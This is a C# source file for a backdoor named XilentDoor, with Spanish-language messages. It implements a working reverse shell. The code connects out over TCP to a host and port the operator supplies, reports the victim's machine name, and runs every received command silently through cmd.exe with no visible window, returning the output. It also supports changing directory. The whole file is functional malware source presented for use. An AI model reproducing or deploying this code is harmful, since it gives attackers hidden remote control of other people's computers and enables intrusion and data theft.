using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace XilentDoor.Core
{
    public class Backdoor
    {
        private TcpClient client;
        private StreamReader reader;
        private StreamWriter writer;

        public void Start(string host, int port)
        {
            try
            {
                client = new TcpClient();
                client.Connect(host, port);
                NetworkStream stream = client.GetStream();
                reader = new StreamReader(stream);
                writer = new StreamWriter(stream) { AutoFlush = true };

                writer.WriteLine("[+] Conexión establecida desde " + Environment.MachineName);

                while (true)
                {
                    ShowPrompt();
                    string command = reader.ReadLine();
                    if (command == null) break;

                    if (command.ToLower() == "exit")
                    {
                        break;
                    }
                    else if (command.StartsWith("cd "))
                    {
                        string path = command.Substring(3).Trim();
                        try
                        {
                            Directory.SetCurrentDirectory(path);
                            writer.WriteLine($"[+] Directorio cambiado a: {Directory.GetCurrentDirectory()}");
                        }
                        catch (Exception ex)
                        {
                            writer.WriteLine($"[!] Error: {ex.Message}");
                        }
                    }
                    else
                    {
                        string output = ExecuteCommand(command);
                        writer.WriteLine(output);
                    }
                }
            }
            catch (Exception ex)
            {
                // Manejar errores ?
            }
            finally
            {
                reader?.Close();
                writer?.Close();
                client?.Close();
            }
        }

        private string ExecuteCommand(string cmd)
        {
            try
            {
                Process proc = new Process();
                proc.StartInfo.FileName = "cmd.exe";
                proc.StartInfo.Arguments = "/c " + cmd;
                proc.StartInfo.RedirectStandardOutput = true;
                proc.StartInfo.RedirectStandardError = true;
                proc.StartInfo.UseShellExecute = false;
                proc.StartInfo.CreateNoWindow = true;
                proc.Start();
                string output = proc.StandardOutput.ReadToEnd();
                string error = proc.StandardError.ReadToEnd();
                proc.WaitForExit();
                return output + error;
            }
            catch (Exception ex)
            {
                return "[!] Error ejecutando comando: " + ex.Message;
            }
        }

        private void ShowPrompt()
        {
            writer.Write("XilentDoor > ");
            writer.Flush(); 
        }
    }
}
